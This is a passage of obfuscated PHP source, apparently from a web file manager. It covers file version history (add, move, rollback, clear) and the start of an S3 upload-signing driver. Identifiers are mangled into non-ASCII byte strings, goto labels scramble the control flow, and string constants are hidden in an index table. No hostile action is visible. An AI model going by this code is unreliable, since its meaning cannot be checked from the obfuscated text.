&& $c´¸¼¦Öò[$b‘ áƒñœé[366]]) { self::moveHistory($B·—óé¹µÉ, $B¸ÑöÁ©[1]); } } else { IO::rename($DÀÉ¢Áó‘[$b‘ áƒñœé[76]], $B¸ÑöÁ©[1]); } } public static function eventBeforeMove($BËÌ‹à¾Ò) { goto aŸ­Ò¦‚¶ß; aŸ­Ò¦‚¶ß: $FùªÍ‰ˆó„ =& $_SERVER[´¬]; $F½Ëˆ‡§É‘ = self::parsePath($BËÌ‹à¾Ò[0]); if (!$F½Ëˆ‡§É‘) { return; } goto E´‡œİà®Š; c¨÷óñíñæ: if ($bÚô´„ÜÕ[$FùªÍ‰ˆó„[29]] == $FùªÍ‰ˆó„[192]) { $A™òŠ„ó‚Ô = self::listData($F½Ëˆ‡§É‘); $F—ºÃøÑÆ¶ = rtrim($fŠ‹Åö‰—, $FùªÍ‰ˆó„[8]) . $FùªÍ‰ˆó„[8] . ($Cğ–²Öæ ? $Cğ–²Öæ : get_path_this($F½Ëˆ‡§É‘)); $cÉ§ë£èì = self::listData($F—ºÃøÑÆ¶); if ($A™òŠ„ó‚Ô && $A™òŠ„ó‚Ô[$FùªÍ‰ˆó„[366]] && $cÉ§ë£èì && $cÉ§ë£èì[$FùªÍ‰ˆó„[366]]) { return self::clear($F½Ëˆ‡§É‘); } if ($A™òŠ„ó‚Ô && $A™òŠ„ó‚Ô[$FùªÍ‰ˆó„[366]]) { self::moveHistory($F½Ëˆ‡§É‘, $Cğ–²Öæ, $a÷·Ö“†•Ê); } } else { IO::move($bÚô´„ÜÕ[$FùªÍ‰ˆó„[76]], $a÷·Ö“†•Ê, !1, $Cğ–²Öæ); self::clearEmptyFolder(IO::pathFather($bÚô´„ÜÕ[$FùªÍ‰ˆó„[76]])); } goto f¹æ½ó‰ğå; EÒŞ—ÀÙ×÷: $bÚô´„ÜÕ = self::checkInHistory($F½Ëˆ‡§É‘); if (!$bÚô´„ÜÕ) { return; } $a÷·Ö“†•Ê = self::pathHistory($fŠ‹Åö‰—); goto c¨÷óñíñæ; E´‡œİà®Š: $fŠ‹Åö‰— = self::parsePath($BËÌ‹à¾Ò[1]); if (!$fŠ‹Åö‰—) { return; } $Cğ–²Öæ = $BËÌ‹à¾Ò[3]; goto EÒŞ—ÀÙ×÷; f¹æ½ó‰ğå: } public static function eventAfterRemove($dç÷‚©†ô, $a§„í™•ğí) { goto C–ÇÚöåë¾; C–ÇÚöåë¾: $E”óŞƒóÅ† =& $_SERVER[´¬]; if (!$a§„í™•ğí) { return; } $DÜØ¢ÛÀÜÃ = self::parsePath($dç÷‚©†ô[0]); goto e…„Ïˆ³ëğ; e…„Ïˆ³ëğ: if (!$DÜØ¢ÛÀÜÃ) { return; } $dá¨„ˆÎİÃ = self::checkInHistory($DÜØ¢ÛÀÜÃ); if (!$dá¨„ˆÎİÃ) { return; } goto C×ó”È‰ªŞ; C×ó”È‰ªŞ: if ($dá¨„ˆÎİÃ[$E”óŞƒóÅ†[29]] == $E”óŞƒóÅ†[192]) { $A˜Ô³¡…Ú = self::listData($DÜØ¢ÛÀÜÃ, !1); if ($A˜Ô³¡…Ú && $A˜Ô³¡…Ú[$E”óŞƒóÅ†[366]]) { self::clear($DÜØ¢ÛÀÜÃ, !1); } } else { IO::remove($dá¨„ˆÎİÃ[$E”óŞƒóÅ†[76]]); self::clearEmptyFolder(IO::pathFather($dá¨„ˆÎİÃ[$E”óŞƒóÅ†[76]])); } goto a„ù¬Á˜êª; a„ù¬Á˜êª: } private static function checkInHistory($e’ÒéËêĞ‰) { $D¼‚ÏŞœŞ = self::pathHistory($e’ÒéËêĞ‰); if (!IO::exist($D¼‚ÏŞœŞ)) { $D¼‚ÏŞœŞ .= $_SERVER[´¬][1119]; } return IO::exist($D¼‚ÏŞœŞ) ? IO::info($D¼‚ÏŞœŞ) : !1; } private static function parsePath($F²¤  †‡Ë) { goto b÷ª’ë‹äâ; Dˆª·Œ¸¤: $fÒâ¥¿µ = KodIO::parse($F²¤  †‡Ë); $BÚ¦Œóáª¢ = $fÒâ¥¿µ[$B½äËˆ¨[29]]; $E­œãÏìÒ’ = !$BÚ¦Œóáª¢ || $BÚ¦Œóáª¢ == KodIO::KOD_IO || $BÚ¦Œóáª¢ == KodIO::KOD_SHARE_ITEM; goto eĞôóŒá£‰; e‡Ûš·Õò: $c§ÎĞÙÛÜ  = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $B½äËˆ¨[1122]); foreach ($c§ÎĞÙÛÜ  as $fè³¡Ü÷ºÇ) { if (!$BÚ¦Œóáª¢ && substr($F²¤  †‡Ë, 0, strlen($fè³¡Ü÷ºÇ)) == $fè³¡Ü÷ºÇ) { return !1; } } self::log($GLOBALS[$B½äËˆ¨[1044]] . $B½äËˆ¨[1123] . $F²¤  †‡Ë); goto A£ÈšÈ…é´; A£ÈšÈ…é´: return $F²¤  †‡Ë; goto CÈ¬ÀÔ‘˜; b÷ª’ë‹äâ: $B½äËˆ¨ =& $_SERVER[´¬]; if (!$F²¤  †‡Ë) { return !1; } if ($GLOBALS[$B½äËˆ¨[1120]]) { return; } goto Dˆª·Œ¸¤; eĞôóŒá£‰: if (!$E­œãÏìÒ’ || !$fÒâ¥¿µ[$B½äËˆ¨[1121]]) { return !1; } if ($BÚ¦Œóáª¢ == KodIO::KOD_SHARE_ITEM) { $dõøğ©ŒÛÚ = IO::init($F²¤  †‡Ë); if ($dõøğ©ŒÛÚ->pathParse[$B½äËˆ¨[1049]]) { return self::parsePath($dõøğ©ŒÛÚ->pathParse[$B½äËˆ¨[1049]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto e‡Ûš·Õò; CÈ¬ÀÔ‘˜: } private static function pathHistory($f¹ˆğ×æšä) { $a¦‹™¹¸µÁ =& $_SERVER[´¬]; $fƒ¤ÜÁ›Á = self::$_historyBase . ltrim(KodIO::clear($f¹ˆğ×æšä), $a¦‹™¹¸µÁ[8]); $fƒ¤ÜÁ›Á = str_replace(array($a¦‹™¹¸µÁ[1124]), array($a¦‹™¹¸µÁ[1125]), $fƒ¤ÜÁ›Á); return $fƒ¤ÜÁ›Á; } public static function log($bä˜Ô‰Õ…â) { } public static function historyCount($Añİ™Úƒ•) { $Fó¬ç‹¿³Ì =& $_SERVER[´¬]; $C¬òÂö·¦ = array(); $AùéêÙ¬Î‹ = array(); foreach ($Añİ™Úƒ• as $eÛ³¾¯åÚ) { $F¾çÑôåÌ = get_path_father($eÛ³¾¯åÚ); if (!$AùéêÙ¬Î‹[$F¾çÑôåÌ]) { $AùéêÙ¬Î‹[$F¾çÑôåÌ] = array(); } $AùéêÙ¬Î‹[$F¾çÑôåÌ][] = get_path_this($eÛ³¾¯åÚ); } foreach ($AùéêÙ¬Î‹ as $F¾çÑôåÌ => $f²‡Ø‰ŒÚ) { $fµƒÏ¢Š = self::parsePath($F¾çÑôåÌ); if (!$fµƒÏ¢Š) { continue; } foreach ($f²‡Ø‰ŒÚ as $aÙø×ìºÕ®) { $a®°ù„„”ˆ = self::listData(rtrim($fµƒÏ¢Š, $Fó¬ç‹¿³Ì[8]) . $Fó¬ç‹¿³Ì[8] . $aÙø×ìºÕ®, !1); if ($a®°ù„„”ˆ && $a®°ù„„”ˆ[$Fó¬ç‹¿³Ì[366]]) { $C¬òÂö·¦[rtrim($F¾çÑôåÌ, $Fó¬ç‹¿³Ì[8]) . $Fó¬ç‹¿³Ì[8] . $aÙø×ìºÕ®] = count($a®°ù„„”ˆ[$Fó¬ç‹¿³Ì[366]]); } } } return $C¬òÂö·¦; } public static function add($e·Ù˜ê–¥) { goto d†İ‘Ñˆ¹; c†‘óã°ñè: if ($dğì®Âïåõ <= 0) { return; } $FÕÉÍšîÌ¿ = IO::hashSimple($e·Ù˜ê–¥); $E‹½ÈƒËğå = IO::info($e·Ù˜ê–¥); goto F÷§Óùåá«; c‹›Á–äÓÍ: $c”½îÆèÈ = array($Fº÷¾»–Çˆ[392] => $FœÑ®çÃ±·, $Fº÷¾»–Çˆ[171] => $FÕÉÍšîÌ¿, $Fº÷¾»–Çˆ[28] => $E‹½ÈƒËğå[$Fº÷¾»–Çˆ[28]] . $Fº÷¾»–Çˆ[95] . date($Fº÷¾»–Çˆ[1128]) . rand_string(1), $Fº÷¾»–Çˆ[78] => $E‹½ÈƒËğå[$Fº÷¾»–Çˆ[78]], $Fº÷¾»–Çˆ[430] => USER_ID, $Fº÷¾»–Çˆ[193] => time(), $Fº÷¾»–Çˆ[1129] => $Fº÷¾»–Çˆ[33]); IO::mkdir($d¤ãÍÜØ¾˜[$Fº÷¾»–Çˆ[1130]]); $FÜÕƒĞ®ÅÇ = IO::copy($e·Ù˜ê–¥, $d¤ãÍÜØ¾˜[$Fº÷¾»–Çˆ[1130]], !1, $c”½îÆèÈ[$Fº÷¾»–Çˆ[28]]); goto cöËÂÑ­Á¨; F÷§Óùåá«: $dŞ™·¢ŸŠÁ = $d¤ãÍÜØ¾˜[$Fº÷¾»–Çˆ[366]]; if ($E‹½ÈƒËğå[$Fº÷¾»–Çˆ[78]] == 0) { return; } if ($E‹½ÈƒËğå[$Fº÷¾»–Çˆ[78]] >= 1024 * 1024 * 500) { return !1; } goto E±‚ïˆ£«´; cöËÂÑ­Á¨: if (!$FÜÕƒĞ®ÅÇ) { self::clearEmptyFolder($d¤ãÍÜØ¾˜[$Fº÷¾»–Çˆ[1130]]); return !1; } array_unshift($dŞ™·¢ŸŠÁ, $c”½îÆèÈ); if (count($dŞ™·¢ŸŠÁ) > $fòÄ½–±£ù) { $C“–†àŒï‘ = array_slice($dŞ™·¢ŸŠÁ, $fòÄ½–±£ù); foreach ($C“–†àŒï‘ as $Aù›‰Ó¡Šô) { IO::remove($d¤ãÍÜØ¾˜[$Fº÷¾»–Çˆ[1130]] . $Aù›‰Ó¡Šô[$Fº÷¾»–Çˆ[28]]); } $dŞ™·¢ŸŠÁ = array_slice($dŞ™·¢ŸŠÁ, 0, $fòÄ½–±£ù); } goto cİóÒèª†‰; d†İ‘Ñˆ¹: $Fº÷¾»–Çˆ =& $_SERVER[´¬]; $d¤ãÍÜØ¾˜ = self::listData($e·Ù˜ê–¥); if (!$d¤ãÍÜØ¾˜) { return; } goto cºÖ…­ÙˆÕ; E±‚ïˆ£«´: if ($dŞ™·¢ŸŠÁ && $dŞ™·¢ŸŠÁ[0][$Fº÷¾»–Çˆ[171]] == $FÕÉÍšîÌ¿) { return !0; } if (array_key_exists($Fº÷¾»–Çˆ[195], $E‹½ÈƒËğå) && !$E‹½ÈƒËğå[$Fº÷¾»–Çˆ[195]]) { return !1; } $FœÑ®çÃ±· = short_id(time()); goto c‹›Á–äÓÍ; cİóÒèª†‰: return self::saveData($d¤ãÍÜØ¾˜[$Fº÷¾»–Çˆ[1131]], $dŞ™·¢ŸŠÁ); goto fø«‹Š²ßš; cºÖ…­ÙˆÕ: $FƒÚóñÛº– = Model($Fº÷¾»–Çˆ[730])->get($Fº÷¾»–Çˆ[1126]); $dğì®Âïåõ = $GLOBALS[$Fº÷¾»–Çˆ[6]][$Fº÷¾»–Çˆ[88]][$Fº÷¾»–Çˆ[1105]]; $fòÄ½–±£ù = $FƒÚóñÛº– == $Fº÷¾»–Çˆ[1127] ? 5 : $dğì®Âïåõ; goto c†‘óã°ñè; fø«‹Š²ßš: } public static function remove($b¢µ––Ãœ×, $E¨¼µä˜’ˆ) { $F‘İ¨°êŠ˜ =& $_SERVER[´¬]; $Fµ•°“‚‘” = self::listData($b¢µ––Ãœ×); $DÇ³‹»Şï = array(); if (!$Fµ•°“‚‘”) { return !1; } foreach ($Fµ•°“‚‘”[$F‘İ¨°êŠ˜[366]] as $Eè†í¯á½) { if ($Eè†í¯á½[$F‘İ¨°êŠ˜[392]] == $E¨¼µä˜’ˆ) { IO::remove($Fµ•°“‚‘”[$F‘İ¨°êŠ˜[1130]] . $Eè†í¯á½[$F‘İ¨°êŠ˜[28]]); continue; } $DÇ³‹»Şï[] = $Eè†í¯á½; } return self::saveData($Fµ•°“‚‘”[$F‘İ¨°êŠ˜[1131]], $DÇ³‹»Şï); } public static function clear($cŞÔ”œƒ‚, $fƒ˜”˜ÚÚ¤ = true) { $cÓÁƒÇÁ„ =& $_SERVER[´¬]; $F‰‚‡ˆ’ç = self::listData($cŞÔ”œƒ‚, $fƒ˜”˜ÚÚ¤); if (!$F‰‚‡ˆ’ç) { return !1; } foreach ($F‰‚‡ˆ’ç[$cÓÁƒÇÁ„[366]] as $Fºİ¼·‘‡“) { IO::remove($F‰‚‡ˆ’ç[$cÓÁƒÇÁ„[1130]] . $Fºİ¼·‘‡“[$cÓÁƒÇÁ„[28]]); } return self::saveData($F‰‚‡ˆ’ç[$cÓÁƒÇÁ„[1131]], array()); } public static function moveHistory($fçŠ»¾é†ç, $Eì®òçØõä = '', $cÒŠŸîøæç = '') { goto AÀ˜±‘è¹; B¤·”«éÑô: $eŒ‡Á“À” = substr(get_path_this($eëíÜĞ‚ø„[$EãéÇ­¸æœ[1131]]), 0, -strlen($Eõ‡±¦ò¸)); foreach ($eëíÜĞ‚ø„[$EãéÇ­¸æœ[366]] as $B Íé®˜¸Ï => $e¬¹éºê¿) { $eê·›ØÂÃ = $Eì®òçØõä . substr($e¬¹éºê¿[$EãéÇ­¸æœ[28]], strlen($eŒ‡Á“À”)); $A‘”·ÜÃö = IO::move($eëíÜĞ‚ø„[$EãéÇ­¸æœ[1130]] . $e¬¹éºê¿[$EãéÇ­¸æœ[28]], $cÒŠŸîøæç, !1, $eê·›ØÂÃ); if ($A‘”·ÜÃö) { $eëíÜĞ‚ø„[$EãéÇ­¸æœ[366]][$B Íé®˜¸Ï][$EãéÇ­¸æœ[28]] = $eê·›ØÂÃ; } } $eëíÜĞ‚ø„[$EãéÇ­¸æœ[1131]] = IO::move($eëíÜĞ‚ø„[$EãéÇ­¸æœ[1131]], $cÒŠŸîøæç, !1, $Eì®òçØõä . $Eõ‡±¦ò¸); goto Aó§„Ü‚; Aó§„Ü‚: self::saveData($eëíÜĞ‚ø„[$EãéÇ­¸æœ[1131]], $eëíÜĞ‚ø„[$EãéÇ­¸æœ[366]]); self::clearEmptyFolder($eëíÜĞ‚ø„[$EãéÇ­¸æœ[1130]]); goto b¤äƒôô©Ã; E÷¦è¾†²Ñ: $Eõ‡±¦ò¸ = $EãéÇ­¸æœ[1119]; $Eì®òçØõä = $Eì®òçØõä ? $Eì®òçØõä : get_path_this($fçŠ»¾é†ç); $cÒŠŸîøæç = $cÒŠŸîøæç ? $cÒŠŸîøæç : $eëíÜĞ‚ø„[$EãéÇ­¸æœ[1130]]; goto B¤·”«éÑô; AÀ˜±‘è¹: $EãéÇ­¸æœ =& $_SERVER[´¬]; $eëíÜĞ‚ø„ = self::listData($fçŠ»¾é†ç, !1); if (!$eëíÜĞ‚ø„ || !$eëíÜĞ‚ø„[$EãéÇ­¸æœ[366]]) { return !1; } goto E÷¦è¾†²Ñ; b¤äƒôô©Ã: } public static function rollback($cÏ×êæè–, $e‚ÓœÉ‹àÏ) { $D†÷Ş÷ÊÉ =& $_SERVER[´¬]; $F£ÏÃ‚— = self::listData($cÏ×êæè–); if (!$F£ÏÃ‚—) { return; } $F§§ÁÈœ = IO::info($cÏ×êæè–); foreach ($F£ÏÃ‚—[$D†÷Ş÷ÊÉ[366]] as $eÇƒÖÕˆÂé => $C­²¬ÙŞ˜) { if ($C­²¬ÙŞ˜[$D†÷Ş÷ÊÉ[392]] == $e‚ÓœÉ‹àÏ) { self::add($cÏ×êæè–); $aÓ…½®¾Á = $F£ÏÃ‚—[$D†÷Ş÷ÊÉ[1130]] . $C­²¬ÙŞ˜[$D†÷Ş÷ÊÉ[28]]; $eã¾ÅÏªƒá = IO::copy($aÓ…½®¾Á, IO::pathFather($cÏ×êæè–), REPEAT_REPLACE, $F§§ÁÈœ[$D†÷Ş÷ÊÉ[28]]); if ($eã¾ÅÏªƒá) { self::remove($cÏ×êæè–, $e‚ÓœÉ‹àÏ); } return $eã¾ÅÏªƒá; } } return !1; } public static function setDetail($dåÜ‚œ¸²Ã, $DˆÃë¦‘•Œ, $CÙ™ãÃº¤) { $Bóåñ å =& $_SERVER[´¬]; $eÓÄ¤‚•á = self::listData($dåÜ‚œ¸²Ã); if (!$eÓÄ¤‚•á) { return; } foreach ($eÓÄ¤‚•á[$Bóåñ å[366]] as $BÓì°šÜé => $d™ƒˆÜƒèã) { if ($d™ƒˆÜƒèã[$Bóåñ å[392]] == $DˆÃë¦‘•Œ) { $eÓÄ¤‚•á[$Bóåñ å[366]][$BÓì°šÜé][$Bóåñ å[1129]] = $CÙ™ãÃº¤; self::saveData($eÓÄ¤‚•á[$Bóåñ å[1131]], $eÓÄ¤‚•á[$Bóåñ å[366]]); return !0; } } return !1; } public static function fileInfo($d¿”»ÂÕÍš, $B—õ‰Á¨Ê) { goto d¢ê—¶Õô¤; bÙ‘¾§–ÆŸ: $CÃß®İ“ Ğ = $b˜Ş˜Ñí´[33]; foreach ($aè©É¼¶µ[$b˜Ş˜Ñí´[366]] as $BÈÃŠÙ»íÛ => $Aå’½åˆ°ò) { if ($Aå’½åˆ°ò[$b˜Ş˜Ñí´[392]] != $B—õ‰Á¨Ê) { continue; } $CÃß®İ“ Ğ = $aè©É¼¶µ[$b˜Ş˜Ñí´[1130]] . $Aå’½åˆ°ò[$b˜Ş˜Ñí´[28]]; break; } if (!$CÃß®İ“ Ğ) { show_json(LNG($b˜Ş˜Ñí´[105]), !1); } goto aéàÊ ğ; aéàÊ ğ: return IO::info($CÃß®İ“ Ğ); goto d‹„³Œ–¦•; d¢ê—¶Õô¤: $b˜Ş˜Ñí´ =& $_SERVER[´¬]; $aè©É¼¶µ = self::listData($d¿”»ÂÕÍš); if (!$aè©É¼¶µ) { show_json(LNG($b˜Ş˜Ñí´[105]), !1); } goto bÙ‘¾§–ÆŸ; d‹„³Œ–¦•: } public static function fileOut($C‘›êÕ¢Ü¶, $Dà–âî×ÜÂ, $b®–® Ï¦ë = false) { $aµ×“¢ËÒÖ =& $_SERVER[´¬]; $A‘šùÕ…Ê¦ = self::fileInfo($C‘›êÕ¢Ü¶, $Dà–âî×ÜÂ); $fàƒø’È§¼ =& $GLOBALS[$aµ×“¢ËÒÖ[7]]; $b®–® Ï¦ë = isset($fàƒø’È§¼[$aµ×“¢ËÒÖ[1095]]) && $fàƒø’È§¼[$aµ×“¢ËÒÖ[1095]] == 1; if (isset($fàƒø’È§¼[$aµ×“¢ËÒÖ[29]]) && $fàƒø’È§¼[$aµ×“¢ËÒÖ[29]] == $aµ×“¢ËÒÖ[1132]) { return IO::fileOutImage($A‘šùÕ…Ê¦[$aµ×“¢ËÒÖ[76]], $fàƒø’È§¼[$aµ×“¢ËÒÖ[1133]]); } IO::fileOut($A‘šùÕ…Ê¦[$aµ×“¢ËÒÖ[76]], $b®–® Ï¦ë, get_path_this($C‘›êÕ¢Ü¶)); } public static function listData($a×ÛĞ™ ¹, $bàÎŞøƒ¤­ = true) { goto bÍÖóŞ®·í; A¾ÖĞ®±ˆÚ: if (substr($a×ÛĞ™ ¹, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $fåÕÊí«‰ = self::pathHistory($a×ÛĞ™ ¹); $bÈœÁŞÈ¾Ó = array($D¶Ÿ‘Õ¾ê¾[1131] => $fåÕÊí«‰ . $D¶Ÿ‘Õ¾ê¾[1119], $D¶Ÿ‘Õ¾ê¾[1130] => rtrim(get_path_father($fåÕÊí«‰), $D¶Ÿ‘Õ¾ê¾[8]) . $D¶Ÿ‘Õ¾ê¾[8], $D¶Ÿ‘Õ¾ê¾[366] => array()); goto bİ‘ÈìßÆÊ; bÍÖóŞ®·í: $D¶Ÿ‘Õ¾ê¾ =& $_SERVER[´¬]; if ($bàÎŞøƒ¤­ && !IO::exist($a×ÛĞ™ ¹)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto A¾ÖĞ®±ˆÚ; bİ‘ÈìßÆÊ: $e®Øê¹½ˆ– = IO::getContent($bÈœÁŞÈ¾Ó[$D¶Ÿ‘Õ¾ê¾[1131]]); if ($e®Øê¹½ˆ–) { $cğÊÀ¿Ÿš = json_decode($e®Øê¹½ˆ–, !0); if (is_array($cğÊÀ¿Ÿš)) { $bÈœÁŞÈ¾Ó[$D¶Ÿ‘Õ¾ê¾[366]] = $cğÊÀ¿Ÿš; } } return $bÈœÁŞÈ¾Ó; goto EÁ¤ÀÇÏ·Û; EÁ¤ÀÇÏ·Û: } private static function saveData($C—Í•‹ĞÎ¬, $Bò¦Şè©ôÍ) { goto Fµ„¿“ÂË; EÜÍ©¾¼¹ô: return !0; goto DùÀçØ‰ˆº; a¹‡ÆÓËêã: $Fâë’…Ã†ï = IO::pathFather($C—Í•‹ĞÎ¬); IO::remove($C—Í•‹ĞÎ¬); self::clearEmptyFolder($Fâë’…Ã†ï); goto EÜÍ©¾¼¹ô; Fµ„¿“ÂË: $c‹®£ñâÙ¿ =& $_SERVER[´¬]; self::log($c‹®£ñâÙ¿[1134] . $C—Í•‹ĞÎ¬ . $c‹®£ñâÙ¿[68] . count($Bò¦Şè©ôÍ), $c‹®£ñâÙ¿[715]); if ($Bò¦Şè©ôÍ) { return IO::setContent($C—Í•‹ĞÎ¬, json_encode($Bò¦Şè©ôÍ)); } goto a¹‡ÆÓËêã; DùÀçØ‰ˆº: } public static function clearEmptyFolder($Aˆ¹½¯…) { goto dÊã‚Ñ‰æ; B°ÛâØ‡òÇ: self::clearEmptyFolder($C‡¿‰·à‘¶); goto dè×æ¢îÈï; bÛÔ¹Òçã¡: $CíÚ„Ä¥Ñ± = IO::has($Aˆ¹½¯…, !0); if ($CíÚ„Ä¥Ñ±[$C­«âî¬º«[202]] > 0 || $CíÚ„Ä¥Ñ±[$C­«âî¬º«[203]] > 0) { return; } IO::remove($Aˆ¹½¯…); goto B°ÛâØ‡òÇ; dÊã‚Ñ‰æ: $C­«âî¬º« =& $_SERVER[´¬]; if (trim($Aˆ¹½¯…, $C­«âî¬º«[8]) == trim(self::$_historyBase, $C­«âî¬º«[8])) { return; } $C‡¿‰·à‘¶ = IO::pathFather($Aˆ¹½¯…); goto bÛÔ¹Òçã¡; dè×æ¢îÈï: } private static function getBasePath() { goto F¹Åì¯ïßŞ; fïÅ…ïœÏ: $fßÊ·°à«’ = DATA_PATH . $a·…¦Ÿ¯Ô[1137]; $fßÊ·°à«’ = IO::mkdir($fßÊ·°à«’); $fßÊ·°à«’ = rtrim($fßÊ·°à«’, $a·…¦Ÿ¯Ô[8]) . $a·…¦Ÿ¯Ô[8]; goto cˆç—™³©§; F¹Åì¯ïßŞ: $a·…¦Ÿ¯Ô =& $_SERVER[´¬]; $fßÊ·°à«’ = Model($a·…¦Ÿ¯Ô[1135])->get($a·…¦Ÿ¯Ô[1136]); if (IO::exist($fßÊ·°à«’)) { return $fßÊ·°à«’; } goto fïÅ…ïœÏ; cˆç—™³©§: file_put_contents($fßÊ·°à«’ . $a·…¦Ÿ¯Ô[1138], $a·…¦Ÿ¯Ô[33]); Model($a·…¦Ÿ¯Ô[1135])->set($a·…¦Ÿ¯Ô[1136], $fßÊ·°à«’); return $fßÊ·°à«’; goto fâ¼‘§Í¥•; fâ¼‘§Í¥•: } } goto d¦¢ÊÛªˆñ; C©òÎ¼á: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bÁùèŠ—Ÿ) { parent::__construct($bÁùèŠ—Ÿ); } public function uploadFormData($cÏï«ñ®Ë, $c­˜¥¤Ä˜ = 3600) { goto F±âÖ›Ò; F±âÖ›Ò: $A×÷êÉí­Ã =& $_SERVER[´¬]; $A ‚œÇ—à” = $A×÷êÉí­Ã[191]; $BÀà•Ğ»¹¥ = $A×÷êÉí­Ã[1224]; goto c²ÈÊ”¶Ñİ; c²ÈÊ”¶Ñİ: $DİÓ£â¹áÃ = $A×÷êÉí­Ã[59]; $F˜Ã­ˆ¨©‹ = gmdate($A×÷êÉí­Ã[1225]); $eÌß’Ò°Ì = gmdate($A×÷êÉí­Ã[714]); goto A’´ô¹ƒÌñ; bÆùã•Ïï: $aÃå¨ÜÅÆ = array($this->accessKey, $eÌß’Ò°Ì, $this->region, $DİÓ£â¹áÃ, $Déˆò·–Ï); $e®‡Ü÷†æ = implode($A×÷êÉí­Ã[8], $aÃå¨ÜÅÆ); $cå©ª©ˆï = array($A×÷êÉí­Ã[1191] => gmdate($A×÷êÉí­Ã[1190], strtotime($A×÷êÉí­Ã[1227])), $A×÷êÉí­Ã[1192] => array(array($A×÷êÉí­Ã[1194] => $this->bucket), array($A×÷êÉí­Ã[1193] => $A ‚œÇ—à”), array($A×÷êÉí­Ã[1195], $A×÷êÉí­Ã[1196], $A×÷êÉí­Ã[33]), array($A×÷êÉí­Ã[1195], $A×÷êÉí­Ã[1228], $A×÷êÉí­Ã[33]), array($A×÷êÉí­Ã[1195], $A×÷êÉí­Ã[1229], $A×÷êÉí­Ã[33]), array($A×÷êÉí­Ã[1197] => $cÀ‡¯‡Â…Â), array($A×÷êÉí­Ã[1230] => $e®‡Ü÷†æ), array($A×÷êÉí­Ã[1231] => $BÀà•Ğ»¹¥), array($A×÷êÉí­Ã[1232] => $F˜Ã­ˆ¨©‹), array($A×÷êÉí­Ã[1233] => $BŞãÙËë))); goto A¸Èá¹”÷; A¸Èá¹”÷: $AÀ‡àÜÑñÆ = base64_encode(json_encode($cå©ª©ˆï)); $d•„óŸÍğ = hash_hmac($A×÷êÉí­Ã[1234], $eÌß’Ò°Ì, $A×÷êÉí­Ã[1235] . $this->secret, !0); $fªÈÚ‡¿ = hash_hmac($A×÷êÉí­Ã[1234], $this->region, $d•„óŸÍğ, !0); goto fÔ¤ùœìŞ; A’´ô¹ƒÌñ: $Déˆò·–Ï = $A×÷êÉí­Ã[1226]; $BŞãÙËë = $c­˜¥¤Ä˜ . $A×÷êÉí­Ã[33]; $cÀ‡¯‡Â…Â = $A×÷êÉí­Ã[1189]; goto bÆùã•Ïï; e‚î”´´ã: $c†§¤ˆ‡ó¢ = array($A×÷êÉí­Ã[210] => $A×÷êÉí­Ã[33], $A×÷êÉí­Ã[1236] => $A×÷êÉí­Ã[33], $A×÷êÉí­Ã[1193] => $A ‚œÇ—à”, $A×÷êÉí­Ã[1197] => $cÀ‡¯‡Â…Â, $A×÷êÉí­Ã[1201] => $AÀ‡àÜÑñÆ, $A×÷êÉí­Ã[1237] => $e®‡Ü÷†æ, $A×÷êÉí­Ã[1238] => $BÀà•Ğ»¹¥, $A×÷êÉí­Ã[1239] => $F˜Ã­ˆ¨©‹, $A×÷êÉí­Ã[1240] => $BŞãÙËë, $A×÷êÉí­Ã[1241] => $bÁˆÒ•‰ÄÑ, $A×÷êÉí­Ã[175] => $this->getHost()); return $c†§¤ˆ‡ó¢; goto f¥ğ„³Å™; fÔ¤ùœìŞ: $a„œİ¼¡Œ = hash_hmac($A×÷êÉí­Ã[1234], $DİÓ£â¹áÃ, $fªÈÚ‡¿, !0); $CãØÀ‡ù Ş = hash_hmac($A×÷êÉí­Ã[1234], $Déˆò·–Ï, $a„œİ¼¡Œ, !0); $bÁˆÒ•‰ÄÑ = hash_hmac($A×÷êÉí­Ã[1234], $AÀ‡àÜÑñÆ, $CãØÀ‡ù Ş); goto e‚î”´´ã; f¥ğ„³Å™: } public function multiUploadFormData($a÷¼óÁªÏ, $a‘¦’±Úœ = 3600) { $Fò‚ëŸ’ù¼ =& $_SERVER[´¬]; $fàÛ…­±Ğ¢ = gmdate($Fò‚ëŸ’ù¼[1319]); $cÇÏñ¶° = array(); $B §¯Ó‹òÔ = $this->client->getUploadId($this->bucket, $a÷¼óÁªÏ, $cÇÏñ¶°); if (!$B §¯Ó‹òÔ) { return !1; } return array($Fò‚ëŸ’ù¼[220] => $B §¯Ó‹òÔ, $Fò‚ëŸ’ù¼[175] => $this->getHost() . $Fò‚ëŸ’ù¼[8] . $this->pathEncode($a÷¼óÁªÏ), $Fò‚ëŸ’ù¼[221] => $fàÛ…­±Ğ¢, $Fò‚ëŸ’ù¼[93] => $a÷¼óÁªÏ); } public function multiUploadAuthData($fË§ÉƒĞ„¥, $a÷Íìé‘ˆ = array()) { goto E¦âŠ–ÌëÈ; DÊ§¤Ó”æ: unset($a÷Íìé‘ˆ[$a’Ä‚æÑß‘[93]]); if (isset($a÷Íìé‘ˆ[$a’Ä‚æÑß‘[222]])) { return $this->listUploadParts($FÄÉ©Ë, $a÷Íìé‘ˆ); } $eœ¬çì©«… = array(); goto eÖ²ìŞôŒ; E¦âŠ–ÌëÈ: $a’Ä‚æÑß‘ =& $_SERVER[´¬]; $FÎ’¨Ï­Æƒ = isset($a÷Íìé‘ˆ[$a’Ä‚æÑß‘[168]]) ? $a÷Íìé‘ˆ[$a’Ä‚æÑß‘[168]] : $a’Ä‚æÑß‘[33]; $FÄÉ©Ë = $a÷Íìé‘ˆ[$a’Ä‚æÑß‘[93]]; goto DÊ§¤Ó”æ; b¡½‰¸ÁŠá: $E¿Šª‡çğ‘ = $a’Ä‚æÑß‘[225]; $EÓ¡‰İÚÙ‚ = $a’Ä‚æÑß‘[8] . $this->pathEncode($FÄÉ©Ë) . $FÎ’¨Ï­Æƒ; $E§ÖÚë£Ş = $this->client->__getSignatureV4($eœ¬çì©«…, $c§‰Ã¯®âÛ, $E¿Šª‡çğ‘, $EÓ¡‰İÚÙ‚); goto DŸÇÉÀàÀÃ; eÖ²ìŞôŒ: if (isset($a÷Íìé‘ˆ[$a’Ä‚æÑß‘[1320]])) { $eœ¬çì©«…[$a’Ä‚æÑß‘[1321]] = $a÷Íìé‘ˆ[$a’Ä‚æÑß‘[1320]]; } $D‘ªÊÉÅÌ = 